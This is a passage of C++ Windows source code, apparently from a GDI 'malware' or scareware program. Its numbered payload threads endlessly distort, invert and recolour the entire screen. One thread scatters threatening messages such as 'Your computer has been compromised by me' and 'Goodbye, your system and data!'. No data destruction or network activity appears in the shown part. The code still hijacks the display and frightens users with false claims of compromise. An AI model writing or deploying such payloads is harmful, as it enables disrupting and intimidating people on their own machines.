		for (int yyy = 0; yyy < h; yyy += rndsize) { StretchBlt(hdcCopy, -2 + rand() % 5, yyy, w, rndsize, hdcCopy, 0, yyy, w, rndsize, NOTSRCERASE); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(0, hdc);
		Sleep(1);
		i++;
		xxx *= 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload7_num2(LPVOID lparam) {//callback from caesium.exe
	HDC hdc = GetDC(NULL);
	int x = GetSystemMetrics(SM_CXSCREEN), y = GetSystemMetrics(SM_CYSCREEN), signX = 1, signY = 1, incrementor = 5;
	float x2 = 100.0f, y2 = 100.0f, angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f, angleIncrement = 0.05f, colorA = 0, size = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		x2 += incrementor * signX;
		y2 += incrementor * signY;
		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 2;
			x2 = 76;
		}
		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 2;
			y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 5, RndRGB);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		colorA += 1;
		if (size >= 0 && size <= 100) { size += 0.5; }
	}
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lparam) {//HSL function by UltraDasher965
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	RECT wRect;
	POINT wPt[3];
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)(cos((x + (i * 10)) / 10.f) * 25) * (tan((y & (i * 10)) / 10.f) * 25) + ((x + i) ^ (y + i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1000.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;
				hslcolor.s += 0.01f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 50;
		wPt[0].y = wRect.top + 50;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 50;
		wPt[2].x = wRect.left + 50;
		wPt[2].y = wRect.bottom + 50;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		PlgBlt(hdc, wPt, hdc, wRect.left + 20, wRect.top + 20, (wRect.right + wRect.left) - 40, (wRect.bottom + wRect.top) - 40, 0, 0, 0);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmp);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteDC(hdc);
	DeleteObject(bmpcopy);
	return 0x00;
}
DWORD WINAPI Payload9_num1(LPVOID lparam) {//bitblts by UltraDasher965
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				float fx = ((x + (i * 100)) - (y * (i & 4))) ^ ((x >> 1) + (y << 1));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		BitBlt(hdc, rand() % 20, 0, w, h, hdc, rand() % 20, 0, NOTSRCCOPY);
		BitBlt(hdc, 0, rand() % 20, w, h, hdc, 0, rand() % 20, NOTSRCERASE);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, PATINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		BitBlt(hdc, rand() % w, 10 - rand() % 20, 100, h, hdc, rand() % w, rand() % 20, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 20, rand() % h, w, 100, hdc, rand() % 20, rand() % h, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lparam) {//NO used AI
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0, xxx = 0, yyy = 2;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	RGBQUAD rgbquadCopy;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y += 20) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 30, hdcCopy, 0, y, w, 30, SRCAND); }
		for (int y = 0; y < h; y += 50) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 50, hdcCopy, 0, y, w, 50, NOTSRCERASE); }
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = xxx + ((x + i) ^ (y + i) >> yyy);
				rgbquad[index].rgbRed += fx | yyy;
				rgbquad[index].rgbGreen += fx + yyy;
				rgbquad[index].rgbBlue += fx ^ yyy;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		int rand_num_x = rand() % w, rand_num_y = rand() % h, top_x = 0 + rand_num_x, top_y = 0 + rand_num_y, bottom_x = 300 + rand_num_x, bottom_y = 300 + rand_num_y;
		POINT pnt[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y), rect = CreateRectRgn(top_x, top_y, bottom_x, bottom_y), roundrect = CreateRoundRectRgn(top_x, top_y, bottom_x, bottom_y, 100, 100), polygon = CreatePolygonRgn(pnt, 8, ALTERNATE);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w / 15, h / 15, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 15, h / 15, SRCCOPY);
		InvertRgn(hdc, circle);
		InvertRgn(hdc, rect);
		InvertRgn(hdc, roundrect);
		InvertRgn(hdc, polygon);
		DeleteObject(circle);
		DeleteObject(rect);
		DeleteObject(roundrect);
		DeleteObject(polygon);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(10);
		i++;
		xxx += 3;
		yyy &= 3;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int cx = x - w / 2, cy = y - h / 2;
				int dx = cx * cx, dy = cy * cy;
				int d = 128 + i;
				int fx = d - (d * ceil(fabs(dx + dy) / d));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		BitBlt(hdc, rand() % w, rand() % 15, w - rand() % w, h, hdc, rand() % w, rand() % 15, SRCCOPY);
		BitBlt(hdc, rand() % 15, rand() % h, w, h - rand() % h, hdc, rand() % 15, rand() % h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				rgbquad[index].rgbRed -= x ^ y;
				rgbquad[index].rgbGreen *= y >> x;
				rgbquad[index].rgbBlue += x & y;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num2(LPVOID lparam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), cw = w / 2, ch = h / 2;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = {};
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	void* pixels = nullptr;
	HBITMAP bmp = CreateDIBSection(hdcCopy, &bmi, DIB_RGB_COLORS, &pixels, NULL, 0);
	SelectObject(hdcCopy, bmp);
	RGBQUAD* buffer = (RGBQUAD*)pixels;
	double t = 0.0;
	while (true)
	{
		hdc = GetDC(0);
		for (int y = 0; y < h; ++y)
		{
			for (int x = 0; x < w; ++x)
			{
				double warpX = x + 2000 * abs(sin(y * 0.005 + t));
				double warpY = y + 2000 * abs(cos(x * 0.005 + t));
				bool gridX = fmod(warpX, 40) < 1.5;
				bool gridY = fmod(warpY, 40) < 1.5;
				BYTE r = 255, g = 255, b = 255;
				if (gridX || gridY) { r = g = b = 0; }
				buffer[y * w + x] = { b, g, r, 0 };
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCINVERT);
		ReleaseDC(NULL, hdc);
		t += 0.01;
	}

	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int counter = 90;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + counter;
			lpt[0].y = rect.top - counter;
			lpt[1].x = rect.right + counter;
			lpt[1].y = rect.top + counter;
			lpt[2].x = rect.left - counter;
			lpt[2].y = rect.bottom - counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - counter;
			lpt[0].y = rect.top + counter;
			lpt[1].x = rect.right - counter;
			lpt[1].y = rect.top - counter;
			lpt[2].x = rect.left + counter;
			lpt[2].y = rect.bottom + counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload13_num2(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int c = 100;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + rand() % 150 - 70;
			lpt[0].y = rect.top + rand() % 260 - 190;
			lpt[1].x = rect.right + rand() % 310 - 150;
			lpt[1].y = rect.top + rand() % 610 - 240;
			lpt[2].x = rect.left + c - rand() % 250 - c;
			lpt[2].y = rect.bottom - c + rand() % 290 - c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - rand() % 120 + 56;
			lpt[0].y = rect.top - rand() % 216 + 150;
			lpt[1].x = rect.right - rand() % 290 + 190;
			lpt[1].y = rect.top - rand() % 416 + 250;
			lpt[2].x = rect.left - c + rand() % 230 + c;
			lpt[2].y = rect.bottom + c - rand() % 240 + c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, PATINVERT);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload13_num3(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 200;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += PI / 400;
			DeleteObject(&i);
			DeleteObject(&a);
		}
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload13_num4(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	LPCSTR things[12] = { "shpxvatanmne.exe", "UltraDasher965", "LambdaTechnology", "FUCKASS MAZEICON. NO SKID NO AI.","Your computer has been compromised by me, can't recovered.", "Goodbye, your system and data!", "It's very scary, isn't it?", "what was the point of even having a PC?","what was the purpose of running this?", "Nobody can hear your SOS!", "Just give up, there is only hopelessness!", "ge七 rȝct 丨ol" };
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) {
		hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int thing = rand() % 12;
		HFONT hfnt = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, true, true, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
		SelectObject(hdc, hfnt);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload14_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	double angle = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = abs(x - (w / 2));
				int cy = abs(y - (h / 2));
				int zx = tan(angle) * cx - sin(angle) * cy;
				int zy = cos(angle) * cx + tan(angle) * cy;
				int fx = ((log(zx * zx * zy ^ zy)) + (ceil(zx * zx + zy * zy)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpcopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload14_num2(LPVOID lparam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	float angle = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int skew = static_cast<int>(sin(angle * PI / 180.0f) * 1000);
		POINT destPoints[3] = {
			{ skew, 0 },
			{ w + skew, 0 },
			{ 0, h }
		};
		PlgBlt(hdc, destPoints, hdcCopy, 0, 0, w, h, NULL, 0, 0);
		angle = WrapAngle(angle + 200.0f);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius2 = 500.0f;
	double moveangle = 0;
	while (true)
	{
		hdc = GetDC(0);
		int radius = 150, rx = rand() % w, ry = rand() % h;
		double ax = cos(moveangle) * radius2, ay = sin(moveangle) * radius2;
		StretchBlt(hdc, ax, ay, w, h, hdc, 0, 0, w, h, NOTSRCERASE);
		moveangle = fmod(moveangle + PI / radius2, PI * radius2);
		for (int t = 5; t < w + h; t++, t += 10) {
			int x = (int)(float)(radius + t / cos(t + radius * 10)) + rx;
			int y = (int)(float)(radius + t / sin(t + radius * 15)) + ry;
		}
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload15_num2(LPVOID lparam) {
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int RndRGBCopy = (RndRGB) * 2;
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= RndRGBCopy; }
		for (int i = 0; i < h; i++) { StretchBlt(hdcCopy, -2 + (rand() % 5), i, w, 1, hdcCopy, 0, i, w, 1, NOTSRCCOPY); }
		int x = rand() % h;
		int y = rand() % w;
		for (int i = 0; i < 17; i++) {
			BitBlt(hdc, w, 3, h, h, hdc, w, 0, NOTSRCCOPY);
			BitBlt(hdc, x, -2, -y, x, hdc, x, 0, NOTSRCERASE);
			BitBlt(hdc, 3, h, h, w, hdc, 0, w, SRCPAINT);
			BitBlt(hdc, -6, x, -y, x, hdc, 0, y, SRCINVERT);
			BitBlt(hdc, w, 3, h, h, hdc, w, 0, NOTSRCCOPY);
			BitBlt(hdc, x, -2, -y, x, hdc, x, 0, SRCCOPY);
			BitBlt(hdc, 3, h, h, w, hdc, 0, w, NOTSRCCOPY);
			BitBlt(hdc, -6, x, -y, x, hdc, 0, y, SRCINVERT);
			BitBlt(hdc, h, 1, w, h, hdc, h, 0, SRCERASE);
			BitBlt(hdc, h, -1, -w, h, hdc, h, 0, SRCAND);
			BitBlt(hdc, 1, w, w, h, hdc, 0, w, NOTSRCCOPY);
			BitBlt(hdc, -1, w, -w, h, hdc, 0, w, SRCCOPY);

		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(5);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num3(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 32;
	double chushi = 1;
	while (true) {
		int numCircles = (h / (radius + 4.5)) * radius, count = 0;
		for (int i = 0; i < numCircles; i++) {
			int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * sin(i * 1.2), y = ((h / 2) + radius) + spiralRadius * cos(i * 1.2);
			hdc = GetDC(0);
			HICON hIcon = ExtractIconA(0, "moricons.dll", rand() % 336);
			DrawIconEx(hdc, x, y, hIcon, 32, 32, NULL, NULL, DI_NORMAL);
			ReleaseDC(0, hdc);
			DestroyIcon(hIcon);
			if (count == 10) { count = 0; Sleep(10); }
			else { count++; }
		}
		if (chushi > 2.5) { chushi = 1; }
		else { chushi = chushi + 0.1; }
		Sleep(333);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload16_num1(LPVOID lparam) {
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0, radius = 8.0f;
	BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, -1, 0, w, h, hdcCopy, 0, 0, SRCAND);
		BitBlt(hdcCopy, 0, 1, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 1, 0, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 0, -1, w, h, hdcCopy, 0, 0, SRCAND);
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb -= ((i & w) + h) & ((i * 4) + (i / h) >> xxx); }
		for (int y = 0; y < h; y += 40) { StretchBlt(hdcCopy, -20 + rand() % 40, y, w, 40, hdcCopy, 0, y, w, 40, SRCPAINT); }
		for (int x = 0; x < w; x += 40) { StretchBlt(hdcCopy, x, -20 + rand() % 40, 40, h, hdcCopy, x, 0, 40, h, SRCAND); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		float x = cos(angle) * radius, y = tan(angle) * radius;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, x, y, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
		xxx++; xxx ^= 2;
		angle = fmod(angle + PI / radius, PI * radius);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload17_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
